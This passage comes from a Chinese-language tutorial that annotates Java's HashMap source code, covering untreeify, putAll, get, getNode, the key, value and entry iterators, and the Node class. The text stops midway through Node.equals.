<h3 id="5-7-1-untreeify-HashMap-map"><a href="#5-7-1-untreeify-HashMap-map" class="headerlink" title="5.7.1 untreeify(HashMap&lt;K,V&gt; map)"></a>5.7.1 untreeify(HashMap&lt;K,V&gt; map)</h3><p>反树化（红黑树转单链表）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title function_">untreeify</span><span class="params">(HashMap&lt;K,V&gt; map)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; hd = <span class="literal">null</span>, tl = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node&lt;K,V&gt; q = <span class="built_in">this</span>; q != <span class="literal">null</span>; q = q.next) &#123;</span><br><span class="line">        Node&lt;K,V&gt; p = map.replacementNode(q, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (tl == <span class="literal">null</span>)</span><br><span class="line">            hd = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tl.next = p;</span><br><span class="line">        tl = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-7-2-replacementNode-Node-p-Node-next"><a href="#5-7-2-replacementNode-Node-p-Node-next" class="headerlink" title="5.7.2 replacementNode(Node&lt;K,V&gt; p, Node&lt;K,V&gt; next)"></a>5.7.2 replacementNode(Node&lt;K,V&gt; p, Node&lt;K,V&gt; next)</h3><p>替换成普通节点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Node&lt;K,V&gt; <span class="title function_">replacementNode</span><span class="params">(Node&lt;K,V&gt; p, Node&lt;K,V&gt; next)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Node</span>&lt;&gt;(p.hash, p.key, p.value, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="6-putAll-Map-m"><a href="#6-putAll-Map-m" class="headerlink" title="6. putAll(Map&lt;? extends K, ? extends V&gt; m)"></a>6. putAll(Map&lt;? extends K, ? extends V&gt; m)</h1><p>添加集合中所有键值对到当前集合，存在则覆盖。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">putAll</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span> &#123;</span><br><span class="line">    putMapEntries(m, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-1-putMapEntries-Map-m-boolean-evict"><a href="#6-1-putMapEntries-Map-m-boolean-evict" class="headerlink" title="6.1 putMapEntries(Map&lt;? extends K, ? extends V&gt; m, boolean evict)"></a>6.1 putMapEntries(Map&lt;? extends K, ? extends V&gt; m, boolean evict)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">putMapEntries</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m, <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> m.size();</span><br><span class="line">    <span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (table == <span class="literal">null</span>) &#123; <span class="comment">// pre-size</span></span><br><span class="line">            <span class="comment">// 存储s组键值对需要的容器大小，加1.0F原因：ft是浮点数强转为int时，需要向上取整，故加1</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> ((<span class="type">float</span>)s / loadFactor) + <span class="number">1.0F</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> ((ft &lt; (<span class="type">float</span>)MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : MAXIMUM_CAPACITY);</span><br><span class="line">            <span class="keyword">if</span> (t &gt; threshold)</span><br><span class="line">                <span class="comment">// 超出阈值，需重新计算阈值，获取不小于t的2的整数次方，详细：3.1</span></span><br><span class="line">                threshold = tableSizeFor(t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s &gt; threshold)</span><br><span class="line">            <span class="comment">// 扩容，详细：5.3</span></span><br><span class="line">            resize();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;? <span class="keyword">extends</span> <span class="title class_">K</span>, ? <span class="keyword">extends</span> <span class="title class_">V</span>&gt; e : m.entrySet()) &#123;	<span class="comment">// 获取entrySet，详细：8.1、8.4</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="comment">// 使用hash方法计算key的hash值，详细：5.1；通过putVal方法存储键值对，详细：5.2</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, evict);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="7-get-Object-key"><a href="#7-get-Object-key" class="headerlink" title="7. get(Object key)"></a>7. get(Object key)</h1><p>根据key获取value，没找到返回null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="comment">// getNode获取节点，详细：6.1</span></span><br><span class="line">    <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="literal">null</span> ? <span class="literal">null</span> : e.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-1-getNode-int-hash-Object-key"><a href="#7-1-getNode-int-hash-Object-key" class="headerlink" title="7.1 getNode(int hash, Object key)"></a>7.1 getNode(int hash, Object key)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> hash, Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="type">int</span> n; K k;</span><br><span class="line">    <span class="comment">// 对应下标(n - 1) &amp; hash的数组元素不为null</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="literal">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断第一个节点的key是否是要查找的key</span></span><br><span class="line">        <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">            ((k = first.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        <span class="keyword">if</span> ((e = first.next) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            	<span class="comment">// 遍历红黑树，详细：7.2    </span></span><br><span class="line">                <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">          	</span><br><span class="line">            <span class="comment">// 遍历单链表</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-2-getTreeNode-int-h-Object-k"><a href="#7-2-getTreeNode-int-h-Object-k" class="headerlink" title="7.2 getTreeNode(int h, Object k)"></a>7.2 getTreeNode(int h, Object k)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title function_">getTreeNode</span><span class="params">(<span class="type">int</span> h, Object k)</span> &#123;</span><br><span class="line">    <span class="comment">// root()获取根节点方法详细：5.5.1；find方法详细：5.5.4</span></span><br><span class="line">    <span class="keyword">return</span> ((parent != <span class="literal">null</span>) ? root() : <span class="built_in">this</span>).find(h, k, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="8-迭代器（间接遍历）"><a href="#8-迭代器（间接遍历）" class="headerlink" title="8. 迭代器（间接遍历）"></a>8. 迭代器（间接遍历）</h1><h2 id="8-1-HashIterator"><a href="#8-1-HashIterator" class="headerlink" title="8.1 HashIterator"></a>8.1 HashIterator</h2><p>此迭代器为KeyIterator、ValueIterator、EntryIterator的父类，对应HashMap的方法为：keySet()、values()、entrySet()。调用这些方法返回的对象：KeySet类实例、Values类实例、EntrySet类实例，这些类均实现了Iterable的iterator()方法。使用增强for循环遍历这些对象时，自动调用了它们自身的iterator()方法，它们自身的这个方法又分别创建对应的迭代器（均继承了HashIterator），通过HashIterator的hasNext()、nextNode()来实现这一切。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">HashIterator</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; next;        <span class="comment">// next entry to return</span></span><br><span class="line">    Node&lt;K,V&gt; current;     <span class="comment">// current entry</span></span><br><span class="line">    <span class="type">int</span> expectedModCount;  <span class="comment">// for fast-fail</span></span><br><span class="line">    <span class="type">int</span> index;             <span class="comment">// current slot</span></span><br><span class="line"></span><br><span class="line">    HashIterator() &#123;</span><br><span class="line">        expectedModCount = modCount;</span><br><span class="line">        Node&lt;K,V&gt;[] t = table;</span><br><span class="line">        current = next = <span class="literal">null</span>;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (t != <span class="literal">null</span> &amp;&amp; size &gt; <span class="number">0</span>) &#123; <span class="comment">// advance to first entry</span></span><br><span class="line">            <span class="comment">// 循环直到找到不为null的数组元素节点，或完整遍历一次。next保存下一次nextNode()调用的节点</span></span><br><span class="line">            <span class="keyword">do</span> &#123;&#125; <span class="keyword">while</span> (index &lt; t.length &amp;&amp; (next = t[index++]) == <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> next != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Node&lt;K,V&gt; <span class="title function_">nextNode</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        Node&lt;K,V&gt; e = next;</span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="keyword">if</span> ((next = (current = e).next) == <span class="literal">null</span> &amp;&amp; (t = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 与构造器中的类似，找到不为null的数组元素，或完整遍历一次。</span></span><br><span class="line">            <span class="keyword">do</span> &#123;&#125; <span class="keyword">while</span> (index &lt; t.length &amp;&amp; (next = t[index++]) == <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; p = current;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>();</span><br><span class="line">        <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        current = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> p.key;</span><br><span class="line">        removeNode(hash(key), key, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        expectedModCount = modCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-2-KeyIterator"><a href="#8-2-KeyIterator" class="headerlink" title="8.2 KeyIterator"></a>8.2 KeyIterator</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">KeyIterator</span> <span class="keyword">extends</span> <span class="title class_">HashIterator</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;K&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> K <span class="title function_">next</span><span class="params">()</span> &#123; <span class="keyword">return</span> nextNode().key; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>keySet()</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set&lt;K&gt; <span class="title function_">keySet</span><span class="params">()</span> &#123;</span><br><span class="line">    Set&lt;K&gt; ks = keySet;</span><br><span class="line">    <span class="keyword">if</span> (ks == <span class="literal">null</span>) &#123;</span><br><span class="line">        ks = <span class="keyword">new</span> <span class="title class_">KeySet</span>();</span><br><span class="line">        keySet = ks;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>KeySet类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">KeySet</span> <span class="keyword">extends</span> <span class="title class_">AbstractSet</span>&lt;K&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>                 &#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>               &#123; HashMap.<span class="built_in">this</span>.clear(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Iterator&lt;K&gt; <span class="title function_">iterator</span><span class="params">()</span>     &#123; <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KeyIterator</span>(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123; <span class="keyword">return</span> containsKey(o); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> removeNode(hash(key), key, <span class="literal">null</span>, <span class="literal">false</span>, <span class="literal">true</span>) != <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Spliterator&lt;K&gt; <span class="title function_">spliterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">KeySpliterator</span>&lt;&gt;(HashMap.<span class="built_in">this</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> K&gt; action)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab;</span><br><span class="line">        <span class="keyword">if</span> (action == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mc</span> <span class="operator">=</span> modCount;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next)</span><br><span class="line">                    action.accept(e.key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (modCount != mc)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-3-ValueIterator"><a href="#8-3-ValueIterator" class="headerlink" title="8.3 ValueIterator"></a>8.3 ValueIterator</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ValueIterator</span> <span class="keyword">extends</span> <span class="title class_">HashIterator</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;V&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">next</span><span class="params">()</span> &#123; <span class="keyword">return</span> nextNode().value; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>values()</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Collection&lt;V&gt; <span class="title function_">values</span><span class="params">()</span> &#123;</span><br><span class="line">    Collection&lt;V&gt; vs = values;</span><br><span class="line">    <span class="keyword">if</span> (vs == <span class="literal">null</span>) &#123;</span><br><span class="line">        vs = <span class="keyword">new</span> <span class="title class_">Values</span>();</span><br><span class="line">        values = vs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Values类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Values</span> <span class="keyword">extends</span> <span class="title class_">AbstractCollection</span>&lt;V&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>                 &#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>               &#123; HashMap.<span class="built_in">this</span>.clear(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Iterator&lt;V&gt; <span class="title function_">iterator</span><span class="params">()</span>     &#123; <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ValueIterator</span>(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123; <span class="keyword">return</span> containsValue(o); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Spliterator&lt;V&gt; <span class="title function_">spliterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ValueSpliterator</span>&lt;&gt;(HashMap.<span class="built_in">this</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> V&gt; action)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab;</span><br><span class="line">        <span class="keyword">if</span> (action == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mc</span> <span class="operator">=</span> modCount;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next)</span><br><span class="line">                    action.accept(e.value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (modCount != mc)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-4-EntryIterator"><a href="#8-4-EntryIterator" class="headerlink" title="8.4 EntryIterator"></a>8.4 EntryIterator</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">EntryIterator</span> <span class="keyword">extends</span> <span class="title class_">HashIterator</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;Map.Entry&lt;K,V&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Map.Entry&lt;K,V&gt; <span class="title function_">next</span><span class="params">()</span> &#123; <span class="keyword">return</span> nextNode(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>entrySet()</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() &#123;</span><br><span class="line">    Set&lt;Map.Entry&lt;K,V&gt;&gt; es;</span><br><span class="line">    <span class="keyword">return</span> (es = entrySet) == <span class="literal">null</span> ? (entrySet = <span class="keyword">new</span> <span class="title class_">EntrySet</span>()) : es;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>EntrySet类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">EntrySet</span> <span class="keyword">extends</span> <span class="title class_">AbstractSet</span>&lt;Map.Entry&lt;K,V&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>                 &#123; <span class="keyword">return</span> size; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>               &#123; HashMap.<span class="built_in">this</span>.clear(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Iterator&lt;Map.Entry&lt;K,V&gt;&gt; iterator() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntryIterator</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map.Entry))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;) o;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">        Node&lt;K,V&gt; candidate = getNode(hash(key), key);</span><br><span class="line">        <span class="keyword">return</span> candidate != <span class="literal">null</span> &amp;&amp; candidate.equals(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">            Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;) o;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">return</span> removeNode(hash(key), key, value, <span class="literal">true</span>, <span class="literal">true</span>) != <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Spliterator&lt;Map.Entry&lt;K,V&gt;&gt; spliterator() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySpliterator</span>&lt;&gt;(HashMap.<span class="built_in">this</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> Map.Entry&lt;K,V&gt;&gt; action)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab;</span><br><span class="line">        <span class="keyword">if</span> (action == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mc</span> <span class="operator">=</span> modCount;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="literal">null</span>; e = e.next)</span><br><span class="line">                    action.accept(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (modCount != mc)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Node类"><a href="#Node类" class="headerlink" title="Node类"></a>Node类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单链表类</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt; &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> hash;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">    Node(<span class="type">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">        <span class="built_in">this</span>.hash = hash;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">        <span class="built_in">this</span>.value = value;</span><br><span class="line">        <span class="built_in">this</span>.next = next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> K <span class="title function_">getKey</span><span class="params">()</span>        &#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">getValue</span><span class="params">()</span>      &#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> key + <span class="string">&quot;=&quot;</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">setValue</span><span class="params">(V newValue)</span> &#123;</span><br><span class="line">        <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> value;</span><br><span class="line">        value = newValue;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span 